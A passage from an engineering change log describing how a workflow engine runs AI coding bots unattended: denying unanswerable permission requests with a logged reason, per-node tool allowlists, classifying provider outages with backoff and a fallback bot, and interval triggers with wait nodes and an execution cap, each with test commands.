# Autonomous 24/7 — what changed, per item

Status: living document for the "desenvolvimento contínuo autônomo 24/7" initiative
(Sep 7, 2026). Companion to `2026-09-01-workflow-designer.md` and
`2026-09-02-bot-concurrency.md`. One section per work item; each says what
changed, why, how to verify it, and what was deliberately left out.

## a-unattended-approvals — a workflow node never waits on a click

Branch `feat/a-unattended-approvals`.

### The problem

The live pipeline ("Entrega contínua · nuria-platform", 11 agent nodes on Codex
bots, 09:00 on weekdays) never got past its first node in five days. Every
attempt opened a permission card (`session_search`, `shell gh project
item-list …`) that nobody was there to click; the card stayed open until the
node's `timeoutMinutes` (15 min) ran out, three times over, and the run failed
with "node timed out" — a receipt that says WHEN it died, not WHY. On top of
that, the third attempt's cards carried `approvalScope: "local-computer"`,
which no remembered grant may answer at all.

### What changed

**1. Fail-fast denial on workflow turns** (`server/workflow-unattended-card.ts`
`denyUnattendedWorkflowCard`, called from the `request.opened` fold in
`server/index.ts` with every side effect injected; `server/auto-approve.ts`
`unattendedDenial`).
On a turn whose dispatch was a workflow node (`automationSource: "workflow"`),
a permission request that `autoVerdict` cannot answer is DENIED by the harness
instead of parked on a human. The card is still written to the node's
transcript (title "Denied unattended"), with one free-text `held` line that
names the tool, what it asked, the exact grant key that would have covered it,
the scope, and the rule that decided, e.g.

    denied unattended: shell "/bin/zsh -lc \"gh project item-list 10 --owner @me\"" (key shell:gh) — no always-allow names "shell:gh"

The same line goes to the decision log (`decision: "auto-denied"`, new
`DecisionKind`) and to the engine (`WorkflowEngine.noteDenial`). Questions,
and turns a person / a webhook / a room started, are untouched.

Grace: `OMB_WORKFLOW_DENY_GRACE_MS` (default 0, capped at 10 min). With a
grace the card is titled "Approval needed", the person is notified, and the
harness denies only if nobody answered within the window.

If the denial cannot be delivered (provider gone, ask already settled) the
card stays open with a note saying so, the bot is marked waiting-on-you and
the person is notified as for an ordinary card, and the node timeout is the
backstop it always was. The engine and the audit log learn of a denial only
once the provider took it; a person's click that lands while the answer is
in flight is never overwritten (the card is re-read before it is patched).

The bot is told what it MAY use, not what was refused: the Codex driver
answers a denied permission with a bare decline and discards the harness's
note, so `_buildNodePrompt` lists the effective keys (bot ∪ node, via the new
`botGrants` engine option) and says a denial carries no explanation;
`WORKFLOW_PROMPT` says the same and points at the node prompt. The listed
keys are `unattendedHonoredGrants(bot, node)`: the union minus everything
the verdict would refuse on that turn (desktop scope, command keys with no
program or a shell for one, blind edit keys not declared by the node), so
the prompt never promises a key that ends in a denial.

**2. Per-node allowlist** (`shared/workflow.ts`, `server/workflow-api.ts`,
`server/workflow-run.ts`, `server/index.ts`, `src/components/WorkflowNodePanel.tsx`,
`src/lib/workflow-capabilities.ts`).
Agent nodes carry an optional `alwaysAllow?: string[]` in the same vocabulary
as `bot.alwaysAllow` (`Bash:gh`, `shell:gh`, `session_search`). The validator
flags blanks, padding, repeats and non-lists as `bad-always-allow` (error,
gates a run like every other error); the API pins only the shape (list of
strings, ≤200). The engine passes the node's list to the harness on every
dispatch and re-prompt (`startTurn(…, turn: { alwaysAllow })`), the harness
records it per thread, and the fold judges the request under
`effectiveAlwaysAllow(bot, node)` — the union, bot entries first — with the
existing unattended rules unchanged: a node can name MORE programs, never
broader ones (bare shells, the desktop and the guards are still refused). The
node panel gets a "Pre-approved tools on this node" textarea, one key per
line; the run timeline paints each recorded denial in red under the step.

Two related fixes that the allowlist would have been useless without:

- `namedNarrowly` in `autoVerdict` read EVERY keyless grant as an unnameable
  shell, so `session_search` in a bot's always-allow could never fire
  unattended. The widening is scoped to WORKFLOW turns only (the fold passes
  `workflowGrants`, the node's own keys): there, an ordinary tool's key names
  one thing and fires; a command tool whose key collapsed to the bare tool is
  still refused; and a blind file-edit grant (`edit`, `fileChange` — the card
  carries no path, so the sensitive guard cannot see it) fires only when the
  NODE declared it, never off the bot's list alone. A webhook turn keeps the
  older rule unchanged.
- `WorkflowNodeResult.denials?: string[]` (optional; old receipts load
  unchanged). Denials are carried across a node's attempts (timeout, retry)
  and land on the node's result — on success ("the bot worked around it this
  time"), on the drawn `failed` edge (summary becomes
  `node timed out — denied unattended: …`), and in `run.error` / the failure
  notification when there is no failed edge. The next node's prompt therefore
  names the grant the previous one lacked.

**3. Local-computer scope on a re-dispatch** (`server/turn-provenance.ts`
`turnProvenanceFor`, `server/index.ts` `turnProvenanceByThread`).

What was verified, in code, for the reported sequence (attempt 2 at 09:19
opened cards with `approvalScope: null`; attempt 3 at 09:36 — the engine's
re-dispatch two minutes after the 15-minute timeout — opened cards with
`approvalScope: "local-computer"`):

- The only two ways `integrations.localComputer` gets `scope: "local-computer"`
  are the explicit `bot.computer === "local"` branch and the macOS Auto
  fallback, both via `readCuaConnection()`. The Codex driver tags every card
  from `turn.integrations.localComputer.scope`, per turn, per thread.
- The Auto fallback was gated on `isUnattended(bot.id)` — the per-bot mark —
  which `startTurn` sets synchronously (`markUnattended`) before the mount
  decision in the same call. Within one dispatch nothing observed can clear
  it: a person's `startTurn` on a busy bot throws 409 before its clear; the
  steer route's clear (`auth.kind === "session"`) needs `adapter.steer`, which
  the Codex driver does not implement; the TTL only ages out an IDLE bot.
- Timing matches the engine exactly (09:19 + 15 min timeout + 2 min backoff =
  09:36), so attempt 3 is the engine's dispatch, not a person's.
- Not reproduced from code alone. Two adjacent paths were found on the way:
  (a) a person's message queued on the node's thread while it ran drains
  after the interrupt as an ATTENDED turn (`drainQueuedSends` → plain
  `startTurn`, which clears the bot mark and, on macOS Auto, mounts the
  desktop on the workflow's own task thread) — by then the engine has
  forgotten the thread, so this is a person's turn on that task and is left
  as is; (b) a connector/credential card answered on a node's thread resumes
  it via `cardContinuation` with no unattended opt — after 30 idle minutes the
  bot mark has expired and that resume ran attended. (b) is closed below: a
  continuation inherits the record of the turn it resumes. Whether the live
  build at 09:36 predates the Sep 2 guard (`36219738`) could not be checked
  from here.

The fix moves the decision off the mutable per-bot mark and computes it
ONCE: `turnProvenanceFor(opts, inherited)` (`server/turn-provenance.ts`)
derives `unattended` from the dispatch's own opts — `webhook` and `workflow`
sources and an inherited `unattended: true` are unattended; a routine,
scheduled or Run now, and a person's turn are attended (a routine's prompt
is the person's own text, the decision Auto mode was switched on for;
upstream restricted the mark to webhooks deliberately) — and
`startTurn` writes that record per THREAD (`turnProvenanceByThread`),
synchronously, before any await; a `cardContinuation` inherits the record of
the turn it resumes. The same field now drives the bot mark
(`markUnattended`), the Auto desktop fallback, `approvalModeForTurn` (the Ask
downgrade before the provider spawns) and the `request.opened` fold, all
through `isUnattendedTurn(botId, threadId)` = `unattendedByEither(record,
mark)`, thread record OR bot mark — never narrower than before, so nothing
that asked a human now asks a bot. Room turns (`startGroupTurn`) are
untouched.

### How to test

    pnpm typecheck && pnpm lint
    node_modules/.bin/vitest run server/workflow-run.test.ts server/workflow.test.ts \
      shared/workflow.test.ts server/workflow-api.test.ts server/workflow-store.test.ts \
      server/auto-approve.test.ts src/state server/workflow-unattended-card.test.ts \
      server/turn-provenance.test.ts server/local-routing.test.ts \
      src/lib/workflow-capabilities.test.ts src/lib/workflow-graph.test.ts \
      src/components/WorkflowNodePanel.test.ts server/index.test.ts

Where each behaviour is pinned:

- `server/workflow-unattended-card.test.ts` — the fold's decision, all four
  ways: delivered; undeliverable (card open with a note, card-shown row,
  human notified); grace answered by a person; grace expiring — plus the
  in-flight click race and a vanished card.
- `server/turn-provenance.test.ts` — one unattended answer per source
  (`manual` and `schedule` attended, `webhook`/`workflow` not), continuation
  inheritance, `unattendedByEither`, and the timeout → re-dispatch sequence
  never mounting the desktop.
- `server/auto-approve.test.ts` — webhook keeps the older rule; workflow
  turns fire ordinary-tool grants; blind `edit` fires only off the node;
  `effectiveAlwaysAllow` (union; node cannot widen); `unattendedHonoredGrants`
  (prompt list ⊆ what the verdict honours, checked key by key against
  `autoVerdict`); `unattendedDenial`.
- `server/workflow-run.test.ts` "WorkflowEngine unattended denials" — the
  node prompt lists the effective keys (or says there are none); keys
  reach every dispatch and re-prompt; denials on a finished node; denials
  carried across timeout → interrupt → re-dispatch → failed edge and into the
  successor's prompt; terminal error and notification; cancel forgets.
- `shared/workflow.test.ts`, `server/workflow-api.test.ts` — validation,
  persistence and reload of `alwaysAllow`; `src/lib/workflow-capabilities.test.ts`,
  `src/lib/workflow-graph.test.ts`, `src/state/workflow-reducer.test.ts`,
  `src/components/WorkflowNodePanel.test.ts` — the panel field, the line
  parser, the document diff and the frames.

Manual check on a fixture (never the live app, per `docs/verification`): give a
Codex bot NO grant, run a one-node workflow whose instructions call
`gh project item-list`; the node's transcript shows a "Denied unattended" card
answered within a second, the run reaches its `failed` edge (or fails) inside
the same minute, and the receipt names `key shell:gh`. Add `shell:gh` to the
node's "Pre-approved tools" and re-run: the command runs.

### Left out, on purpose

- No end-to-end test through a live provider: `server/index.test.ts` boots
  the real server against a fake CLI that never raises live permission
  requests. The fold's decision is extracted and unit-tested with every side
  effect injected; what remains in `index.ts` is the binding of those
  effects to the thread, the request and the store.
- Denials are in-memory on the engine: a process restart between a denial and
  the node's result loses that line (the card in the transcript and the
  decision log keep it). Parked denials for pruned or settled runs are
  dropped on the next tick.
- `turnProvenanceByThread` is not pruned on task deletion — one small record
  per thread that ever ran a turn in the process.
- Room turns (`startGroupTurn`) keep the per-bot mark only; the brief asked
  for rooms to be unchanged.
- The grace is process-wide (env), not per node.

## b-provider-resilience — a provider outage must not kill a run

### Evidence

On 2026-09-03 two runs of "Entrega contínua · nuria-platform" failed with

```
unexpected status 404 Not Found: Unknown error, url: https://chatgpt.com/backend-api/codex/responses, cf-ray: …
```

The node's two retries (`attemptFailure`, linear +60 s / +120 s) were spent in ~3 minutes
and the run took the `failed` edge; the API came back a few minutes later. A third run died
with `exit_before_result` (the engine process exited before answering).

### What changed

**1. Failure classification — `server/workflow-failure.ts` (new, pure).**

What the engine actually has in hand for a failed attempt is NOT one clean message. Read off
the four drivers:

| driver path | `runtime.error` message | `turn.completed` stopReason |
| --- | --- | --- |
| codex `turn/completed` error | — | the provider's text (`unexpected status 404 Not Found: …, url: https://chatgpt.com/backend-api/codex/responses, …`) |
| codex launch-catch (`codex.ts` ~1121) | the provider/transport text (`unexpected status 503 …`), `setup: true` when auth | `rpc_error`, or `auth_required` |
| codex close handler | `codex exited N before turn/completed: <stderr tail>` | `exit_before_result` |
| codex termination | `codex did not shut down after termination was requested` | `shutdown_timeout` |
| claude close handler (`claude.ts` ~1240) | `claude exited N before result: <stderr tail>` — the tail is ANYTHING the CLI printed: `fetch failed`, or `Invalid API key · Please run /login`, or `model not found` | `exit_before_result` (always) |
| claude relaunch-catch | the relaunch error | `exit_before_result` |
| acp close handler | `<kind> exited N before the prompt result: …` | `exit_before_result` |
| acp prompt-catch (`core.ts` ~985) | the error text, `setup: true` when auth | `rpc_error` / `auth_required` |
| acp result error | `Model turn failed: <reason>` or the result's own error | the ACP stop reason |
| pi `turn_end` error (`pi.ts` ~713) | `errorMessage` or `pi turn failed` | `failed` |
| pi spawn error / close | `describeSpawnFailure` text with `setup` / nothing | none |

So `attemptFailure` is fed a **described** line and a class computed from the **pair**:

- `describeWorkflowTurnFailure({ stopReason, message, setup })`: a bare stop code (one
  snake_case token: `exit_before_result`, `rpc_error`, `failed`, …) never stands alone — the
  runtime.error message is the substance and the code is kept in parentheses
  (`claude exited 1 before result: TypeError: fetch failed (exit_before_result)`); a descriptive
  stop reason (codex's provider text) stands as is; nothing at all is
  `the bot did not complete this node`. This line is what lands in `outage.reason`, on the
  failed result and in `run.error`.
- `classifyWorkflowTurnFailure(pair)`: `setup: true` → `other` outright; a stop reason that is
  the harness's own stop (`interrupted`, `cancelled`, `aborted`) → `other` whatever
  `runtime.error` was logged earlier (the timeout sweep classifies its own reason as `timeout`
  and forgets the thread before the driver answers the interrupt); else the described line goes
  through `classifyWorkflowFailure`.
- Per-thread `lastRuntimeError` is cleared on every fresh dispatch, on the envelope re-prompt
  (a new turn on the same thread) and when a turn completes ok — codex relays stream errors it
  retries internally (`error` notifications, turn still live), and that message must not
  describe a later turn on the thread.
- `classifyWorkflowFailure(line)`, in precedence order:

| class | rule |
| --- | --- |
| `contention` | "already working" (the harness's 409) — unchanged: re-parked, never charged |
| `capability` | "is not allowed to merge/deploy" — terminal, `failNode` |
| `envelope` | the engine's own "did not produce a valid outcome envelope" |
| `other` (terminal patterns, checked BEFORE any outage rule) | `status/http/error 400/401/403/422`, `401 Unauthorized`, `Invalid API key`, `Missing bearer`, `Not logged in`, `invalid request`, `malformed`, `model not found`/`unknown model`/`does not exist for model`, `isn't installed`/`isn't executable`/`ENOENT`/`EACCES` |
| `other` (account patterns) | `quota`/`billing`/`insufficient_quota`, `/login` — but ONLY when the line carries no 5xx/429 with status context: Gemini's `429 RESOURCE_EXHAUSTED: Quota exceeded` is throttling and is an outage |
| `provider-outage` | a `404` whose line names a provider backend (`backend-api`, `chatgpt.com`, `openai.com`, `anthropic.com`, `googleapis.com`, `api.x.ai`); 5xx with status context (`status 503`, `HTTP 529`, `502 Bad Gateway`); `429` with status context, `rate limit`, `too many requests`, a status followed by an UPPER_CASE reason code (`429 RESOURCE_EXHAUSTED`, `503 UNAVAILABLE`; case-sensitive so "429 tokens" is prose); `overloaded`/`at capacity`; `ECONNRESET`/`ECONNREFUSED`/`ETIMEDOUT`/`ENOTFOUND`/`EAI_AGAIN`/`EPIPE`; `fetch failed`, `socket hang up`, `connection reset/refused`; the drivers' close-handler sentences `exited N before turn/completed | before result | before the prompt result`, `process exited before replying`, `did not shut down` |
| `timeout` | the engine's "node timed out", or `timed out`/`timeout` |
| `other` | everything else — including every bare stop code on its own (`exit_before_result`, `rpc_error`, `failed`, `interrupted`, `spawn_error`) |

Design choice, recorded: **a CLI crash with no explanation of its own is an outage.** The
drivers' close-handler sentences (`codex exited null before turn/completed`,
`claude exited 1 before result` with an empty or uninformative stderr tail) classify as
`provider-outage` — the evidence run of 2026-09-03 died exactly like that when the backend
went away, and a genuine local crash of the CLI will surface a credential, binary or
request-shape message that the terminal patterns catch first. The cost of being wrong is a
wait (bounded by the horizon), not a lost run.

Consequences the reviewer reproduced and that are now pinned by tests: a claude CLI death over a
bad key (`… Invalid API key · Please run /login` + `exit_before_result`) is charged to the node,
never waited out; a codex `503 … backend-api …` arriving on `runtime.error` with `rpc_error` IS
an outage; a bare `exit_before_result` with nothing said is `other`; a stream error codex
retried itself, followed by an ok turn without envelope, a re-prompt and an `interrupted`, is
the node's own failure — never "503 (interrupted)" waited out as an outage.

Why a new module rather than `server/drivers/retry.ts`: that classifier answers "should the
driver relaunch its CLI within one turn" and treats every 404 and every `unexpected status`
as terminal — right for a request the driver just built, wrong for a run that measures in
hours. Why not inside `workflow-run.ts`: 1.2k lines already, and the table tests want a pure
import. The bare-number rules are deliberately conservative ("step 512 failed" is `other`);
a misclassified outage costs up to six hours of waiting, so 5xx/429 require status context.
`BUSY_DISPATCH` moved here so the engine and the classifier share one regexp.

Also exported: `outageDelayMs(attempt, capMs, random)` (60 s × 2^(n−1), capped, ±25 % jitter)
and `outagePlannedAttempts(capMs, horizonMs)` (the "of Z" the UI prints; defaults give 10 in 6 h).

**2. Long backoff without spending attempts — `shared/workflow.ts`, `server/workflow-run.ts`.**

- `Workflow.providerOutage?: { maxBackoffMinutes?: number; horizonHours?: number }`
  (defaults `WORKFLOW_OUTAGE_BACKOFF_CAP_DEFAULT_MIN = 60`, `WORKFLOW_OUTAGE_HORIZON_DEFAULT_H = 6`);
  validated as `bad-numbers`, accepted and clearable (`null`) by the API.
- `WorkflowRun.outage?: { since, until, attempts, of, reason, fallbackBotId? }` — optional, so
  old receipts load unchanged. The wait itself is the run's ordinary `nextAttemptAt`: `dispatchDue`
  re-dispatches it when due and `recoverStranded` leaves it alone (it has a timer), so a restart
  mid-wait needs no special case — this is the design reason for reusing the field.
- `WorkflowRun.currentBotId?: string` — the bot the live dispatch is on. Needed once a
  fallback can hold a node: the timeout sweep, `interruptLiveDispatch`, `activeRunForBot` and the
  envelope re-prompt all address `run.currentBotId ?? node.botId` now, never the canvas bot alone.
- `attemptFailure` classifies first. `provider-outage` → `waitOutOutage`: the run stays `running`,
  `attempt` is untouched, `outage.attempts` increments, `nextAttemptAt = now + delay`. When the
  next slot would land past `outage.until`, the outage is reported spent and the node goes
  **straight** to its `failed` edge / `failNode` with the reason
  `the provider stayed unavailable for Xh (N attempts): <last provider error>` — the linear
  retries are skipped on purpose (two more one-minute retries after six hours of 404s add
  nothing). A non-outage failure after an outage clears `outage` and is charged as usual.
  Contention during an outage re-park keeps the outage. `advance`, `failNode`, `cancelRun` and
  `resumeRun` clear `outage`; a completed node's result never carries it. `outage.until` and
  `outage.of` are recomputed from the workflow's knobs on every outage failure (only `since`
  is fixed), so lengthening the horizon mid-outage is obeyed.
- `workflowOutageWaitMessage(run, formatWhen)` in `shared/workflow.ts` is the one wording:
  "Waiting for the provider: next attempt <when> (attempt Y of Z)". The timeline prints it in
  place of "Retrying at", because nothing of the node's budget is being spent.

**3. Fallback bot on another engine.**

- `AgentNode.fallbackBotId?: string`. `validateWorkflow`: `fallback-same-bot` (error), blank →
  `fallback-missing-bot` (error). `capabilityIssues` (has the roster): `fallback-missing-bot`
  (error) when the lookup returns null, `fallback-missing-capability` (warning) when the fallback
  lacks a `requires` flag — a warning because the engine simply skips it and waits.
- New engine option `botEngine?: (botId) => string | null` (index.ts wires
  `store.bot(id)?.modelSelection.instanceId`). `fallbackEligible`: different bot, both engines
  known and different, `botState === "ready"`, `missingCapabilities(node.requires, …)` empty. An
  engine built without `botEngine` never hands over.
- On the **first** outage failure of the primary, `waitOutOutage` stamps `outage.fallbackBotId`
  and calls `dispatchNode(runId, nodeId, fallbackBotId)` at once — a fresh task on the fallback,
  no attempt charged. Once per outage: if the fallback fails with an outage too, the run enters
  the backoff and every later attempt goes back to the node's own bot (the fallback is a detour,
  not a new home). An ordinary failure on the fallback is charged to the node like any other.
- The 409 race: `fallbackEligible` sees the fallback `ready`, but `startTurn` can still come
  back "already working" (the bot took a turn in between). That contention re-parks the run
  **for the fallback** — `currentBotId` stays on it (`parkedFallbackBot`), so `dispatchDue`
  waits on the fallback's busy state and re-dispatches THERE, and `recoverStranded` re-drives a
  parked or orphaned fallback dispatch on the fallback after a restart. `dispatchNode`'s own busy
  branch keeps the aim too. Without this the reconciler threw the run straight back at the
  dead primary with no backoff and the fallback was never tried again. The timeline says
  "Waiting for fallback bot X to be free (it is busy)" for that state.
- Receipt: a node the fallback finished gets `WorkflowNodeResult.fallback = { botId, because }`;
  the timeline shows "Ran on fallback bot X because: …" on the step and "Running on fallback bot
  X because: …" while it holds the node.
- UI: `WorkflowNodePanel` gains "Fallback bot (other engine)" — every bot but the node's own,
  "None — wait for the provider" first, hidden bots only while bound, a warning when the pick
  shares the primary's engine (`WorkflowPanelBot.engine`, fed from `modelSelection.instanceId`
  by the canvas) or lacks a required capability. Picking "None" drops the key. The hint says the
  fallback runs on its OWN standing permissions (`alwaysAllow`): a workflow turn is unattended,
  so a fallback without e.g. `Bash:gh` always-allowed will card for a human and time out — the
  engine does not copy the primary's grants.
- API: `fallbackBotId: id.optional()` on the agent node schema (blank/padded refused at the door,
  `null` clears); `providerOutage` schema with a `SameKeys` drift guard and in `CLEARABLE_FIELDS`.

### How to test

```
node_modules/.bin/vitest run server/workflow-failure.test.ts     # classification table, backoff math
node_modules/.bin/vitest run server/workflow-outage.test.ts      # engine: entry, progression, horizon, restart, fallback (fake timers)
node_modules/.bin/vitest run shared/workflow.test.ts server/workflow-api.test.ts
node_modules/.bin/vitest run src/components/WorkflowNodePanel.test.ts src/components/WorkflowRunTimeline.test.ts src/state
pnpm typecheck && pnpm lint
```

`workflow-failure.test.ts` has two tables: reason strings, and the (message, stopReason, setup)
pairs per driver path. `workflow-outage.test.ts` ends turns with the same pairs (`failTurn`)
and drives the engine's real 10 s reconciler with `vi.useFakeTimers()`
(`vi.advanceTimersByTimeAsync`), a jitter-free `random: () => 0.5`, and a restart helper that
builds a fresh engine + store over the same files.

Manual check on the real pipeline: set `fallbackBotId` on `codificacao` to a Claude bot,
stop the network for the Codex bot, run — the node should re-dispatch on the Claude bot within
the same second; without a fallback the run should show "Waiting for the provider: next attempt …
(attempt 1 of 10)" and keep `attempt: 0` in `workflow-runs.json`.

### Left out, on purpose

- No canvas UI for `providerOutage` (there is none for `maxNodeExecutions` either); it is
  API/JSON-only for now.
- The fallback is tried once per outage and only from the primary; there is no chain of
  fallbacks and no "prefer the fallback for the rest of the run".
- Auth, request-shape and setup errors are `other`: they retry on the node's budget and are
  never handed to a fallback — a bot with a bad key should fail visibly, not be papered over by
  another bot. A driver that relaunches internally on a transient error (codex/claude
  `turn.retrying`) does so before the engine sees anything; the engine only judges the final
  not-ok turn.
- The claude close handler's stderr tail is 300 chars: a credential error printed earlier than
  that in a long stderr would classify as a plain process death (outage). Not observed; noted.
- `outage.of` is computed on the nominal schedule; jitter can make the real count differ by one.
- The `unexpected status 404` rule needs a provider host in the message. A driver that strips
  the URL would classify the same failure as `other` — the table test pins today's wording.

## d-continuous-cycle — the workflow as a continuous cycle, the engine as the valve

### The problem

The user's pipeline ("Entrega contínua · nuria-platform") was a straight line
scheduled once a day at 09:00: `triagem → spec → codificacao → testes-pre →
revisao → (aprovacao-merge → merge) → deploy → testes-prod → doc →
update-canal`, with `sem-demanda` as the terminal node when triage finds
nothing to do. One shot per day means one shot per day at every failure
mode in the brief, and a lap that finishes at 10:00 sits idle until the next
morning. The engine had three things standing in the way of running it
continuously:

1. `triggers.schedule` knew only `daily` and `once`.
2. There was no way to pause a run between laps: an edge back to the entry
   re-dispatches it the instant the last node finishes.
3. `WORKFLOW_MAX_NODE_EXECUTIONS` defaulted to 30 and counted every step,
   and reaching it was always a hard failure.

### What changed

**1. Interval trigger** (`shared/workflow.ts`, `server/workflow-run.ts`,
`server/workflow-interval.ts`, `server/workflow-api.ts`, canvas schedule
editor in `WorkflowCanvas.tsx`).

```ts
schedule: {
  type: "interval",
  minutes: number,                     // whole, >= 5
  activeHours?: {                      // local wall clock
    start: "HH:MM", end: "HH:MM",      // start > end wraps past midnight
    weekdays?: number[],               // 0 = Sunday; absent = every day
  },
}
```

Semantics — the engine is the valve:

- While the workflow has a LIVE run (queued, running, waiting-approval) the
  clock is held at `undefined`: nothing is armed. A manual or webhook run
  therefore pushes the next scheduled run out; it never stacks a queued run
  behind the live one.
- The moment the workflow is idle, the next run is armed at
  `lastRun.endedAt + minutes` (or `now + minutes` if no run is on record —
  which includes a history pruned by the receipt cap), moved to the next
  active-window start when that instant falls outside `activeHours`.
- Firing reuses the tri-state `nextRunAt` and its double-fire guard: the
  clock is set back to `undefined` BEFORE `startRun`. A crash between the two
  leaves an idle workflow with no clock; the next sweep re-arms one interval
  after the last run. A slot skipped, never a run fired twice.
- **No missed-slot receipt for intervals** (`recordMissedRun` is not used).
  A calendar slot can be missed; an interval has no slot to miss — an armed
  instant in the past is simply "due", so a computer that slept fires once
  on waking. Tested: two days late still starts exactly one run and notifies
  nothing.
- A start the engine REFUSES (validation error, revoked capability) leaves
  the same failed receipt a calendar schedule does, via `recordRefusedRun`.
  That receipt ends "now", and the next arm backs off with the refusal
  streak (see "Integration review": interval × 2^n, capped at 6 h) rather
  than one plain interval — a refusal every 10 s is never possible either
  way.
- Interval math never goes through the injected routine `nextOccurrence`;
  its option type is now `WorkflowCalendarSchedule` (daily/once only). The
  interval helpers are pure and local-timezone (`withinActiveHours`,
  `nextActiveWindowStart`, `intervalFireAt`).

**2. `wait` node** (`kind: "wait"`, `minutes` 1..1440, single outcome
`elapsed`). `dispatchNode` parks the run: `currentNodeId`, a persisted
`waitUntil`, no task, no thread, no notification. A new `sweepWaits` step in
`tick()` (right after `sweepApprovals`, before anything that dispatches)
advances the run through the ordinary `advance()` path once the instant
passes, recording `{ outcome: "elapsed", summary: "Waited N min" }`.
`isStranded` excludes runs carrying `waitUntil` — without that,
`recoverStranded` would re-dispatch the wait node every tick and push the
instant out forever. Cancel, terminal failure and `advance` all clear the
field. A wait node edited away under a parked run fails the run, like an
orphaned approval gate. `sweepTimeouts` ignores it (no `dispatchedAt`).

**3. Execution cap** — semantics changed, deliberately:

- `WORKFLOW_MAX_NODE_EXECUTIONS` default 30 → **200**; `maxNodeExecutions`
  validated in **1..1000** (`bad-numbers`).
- The counter now counts **bot work only**: `agent` and `approval` results
  (`countsTowardExecutionCap`). `wait` and `notify` steps are free — they
  cost nothing and cannot run away on their own, and counting them would
  make a slow cycle pay for pausing. A result whose node was since deleted
  still counts (a safety net must not widen when it cannot classify).
- The check runs only when bot work is about to be dispatched, so a notify
  or wait AFTER the last allowed agent step still executes (a cycle's
  closing notification is never the step the cap swallows).
- **What happens at the cap.** `follow()` brought the run along an edge, so
  the last node was not a sink; the question is whether that edge closed a
  lap ON PURPOSE. The one shape that says so is the continuous cycle: the
  refused node is the **entry** AND the last recorded step is **not bot
  work** (a `wait`, or the `notify` that ends a lap). Then the cap is the
  valve: the run ends `completed` with `error` =
  `execution cap of N bot steps reached before node "X"`, `currentNodeId`
  stays on the last finished step, the queue drains, and the operator is
  notified with kind `cap-reached` (index.ts maps it to a "finished"
  notification). Anything else — an edge back to the entry from a bot step
  (`code → test --retry--> code` two hundred times is not a finished run),
  or a path cut mid-way — ends `failed` with the same reason, `currentNodeId`
  on the refused node (a resume after raising the cap picks up there), and
  the usual failure notification. Both variants notify: hundreds of bot
  turns ending is an event to see, green or red. The timeline shows the
  completed variant as an "Ended:" note in warning tone. Old receipts
  carrying the old wording load unchanged.

**3b. Wait nodes honour the interval trigger's active window.** A lap that
loops inside one run never passes the trigger, so the trigger's window alone
would let bots deploy at 03:00. The persisted truth of a pause is
`waitStartedAt`; on every tick `sweepWaits` recomputes
`due = waitStartedAt + node.minutes` and `resume = nextActiveWindowStart
(current activeHours, max(due, now))` from the definition AS IT IS NOW —
`now`, not `due`, once the pause is over, so a tick that lands late (the
computer slept through 17:59) does not dispatch at 22:00 — advances when
`resume <= now`, and otherwise rewrites `waitUntil` (the instant the UI
shows) whenever it disagrees. So an edit mid-pause — window removed,
loosened, tightened, or the node's minutes changed — takes effect at the
next tick in either direction; `parkOnWait` only pre-fills the same value.
Only an `interval` schedule carries a window; a `daily`/`once` workflow's
waits are plain timers. A hand-edited window allowing no weekday fails the
run with a named reason rather than holding it forever. The receipt's
`startedAt` is `waitStartedAt`, and the summary says how long the run
actually waited.

**Weekday semantics of a window crossing midnight.** The weekday tested is
the one the INSTANT falls on: `22:00–06:00` on `[1]` (Monday) covers Monday
22:00–24:00 and Monday 00:00–06:00 — to cover the early hours of Tuesday,
list Tuesday too. The schedule editor says so under the day toggles.

**4. `cycle-without-wait` warning** in `validateWorkflow`: with every wait
node removed from the graph, if the entry can still reach itself along
routable edges, some lap has no pause in it. Warning on the entry node,
never an error; a cycle that does not pass through the entry (a review
loop) is silent, and so is an entry that is itself a wait node. Existing
fixtures with a self-loop on the entry now carry this warning alongside
`unwired-failure` (`server/index.test.ts` included).

**UI**: palette gets a Wait kind (`WORKFLOW_NODE_KINDS`, default 30 min),
card and panel render it, the run timeline says "Waiting until HH:MM ·
node", and the schedule editor gains an Interval mode with minutes, an
active-hours toggle, from/until times and weekday toggles; the workflows
list shows "Every N min · next run pending" while the clock is held.

### Recommended shape for the user's workflow

```
triagem ──(demanda)──▶ spec ──▶ … ──▶ doc ──▶ update-canal ──(sent)──▶ triagem
   │
   └──(nada)──▶ sem-demanda ──(done)──▶ wait(30) ──(elapsed)──▶ triagem
```

- `sem-demanda → wait(30) → triagem`: an empty triage sleeps half an hour
  and looks again. Without the wait the validator warns (`cycle-without-wait`).
- `update-canal → triagem`: a finished delivery goes straight back to
  triage — there may be more demand. `update-canal` is a notify, so a cap
  hit on that edge is the `completed` variant.
- Trigger: `interval`, 60 min, with `activeHours` for working hours. The
  window is honoured at both points where a lap can start: the trigger
  (first lap of a run) and every wait node (later laps). A lap already in
  flight at 18:00 runs to its end; the window is where laps START, not a
  kill switch.
- The run ends only at the execution cap (or on a failure); the trigger
  brings the workflow back one interval after the run ended, never while
  one is live.
- `maxNodeExecutions`: the user has 24, and wait/notify steps no longer
  count, so that is 24 bot turns. The cap ends a run `completed` only on
  the two loop-closing edges above; hit mid-lap it is a `failed` run that
  the interval trigger recovers from one interval later (with a failure
  notification each time). Two ways to keep it clean: raise the cap to a
  comfortable multiple of a lap (default now 200, up to 1000), or route
  `update-canal` to a sink so one delivery is one run and only the
  no-demand loop cycles inside a run.

### How to test

```
pnpm typecheck
pnpm lint
node_modules/.bin/vitest run server/workflow-interval.test.ts shared/workflow.test.ts \
  server/workflow-run.test.ts server/workflow-api.test.ts server/workflow-store.test.ts \
  server/index.test.ts src/lib src/components/Workflow src/state
```

Engine tests use the fake clock (`setNow`) and `reloadEngine()` for restarts:
wait parks / advances / survives restart / cancels / fails when edited
away / re-reads the node's minutes and the window on every tick from the
persisted start — removed or loosened window releases, tightened holds
(local-time fixtures, timezone-independent) / holds a pause that ended
while the computer slept, and across a restart past the window's end / fails
on a window with no weekday / ignores a daily schedule's absence of a window; interval arms from idle, disarms while live, does not double-fire
across a restart before or after the slot, leaves no missed receipt, honours
the active window at both ends, backs off after a refused start, and
switches cleanly from daily; cap completes (and notifies `cap-reached`)
only for a lap closed through a notify/wait, fails a review loop back to
the entry, fails mid-path, and ignores wait/notify steps.

### Left out

- No UI for `maxNodeExecutions` itself (still only settable through the
  API / JSON), as before.
- `activeHours` is evaluated in the app's local timezone; there is no
  per-workflow timezone. The window gates where laps START (trigger and
  wait nodes); it does not interrupt a lap in flight.
- The wait is a fixed pause. "Wait until HH:MM" or "wait for a webhook" are
  different nodes and were not built.
- The completed-at-cap receipt reuses the `error` field on the run rather
